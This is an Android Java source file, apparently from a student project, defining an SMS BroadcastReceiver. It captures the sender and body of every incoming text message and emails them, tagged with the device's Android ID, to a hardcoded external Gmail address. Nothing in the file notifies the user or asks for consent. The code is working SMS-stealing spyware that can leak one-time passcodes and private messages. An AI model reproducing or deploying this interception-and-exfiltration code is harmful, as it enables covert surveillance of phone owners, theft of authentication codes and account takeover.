package com.example.a2207project;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.os.Message;
import android.provider.Settings;
import android.telephony.SmsMessage;
import android.util.Log;

import java.io.UnsupportedEncodingException;

public class SMSBroadcastReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        Bundle bundle = intent.getExtras();
        if (bundle != null) {
            Object[] pdus = (Object[]) bundle.get("pdus");
            for (int i = 0; i < pdus.length; i++) {
                SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) pdus[i]);
                String sender = smsMessage.getDisplayOriginatingAddress();
                String message = smsMessage.getDisplayMessageBody();
                Log.d("SMSBroadcastReceiver", "Sender: " + sender + "Message: " + message);
                String androidID = MainActivity.androidID;
                EmailHelper.sendEmail("ict1004p2grp4@gmail.com","SMS - "+androidID , "Sender: "+sender +"\nMessage: "+ message);
            }
        }
    }

}
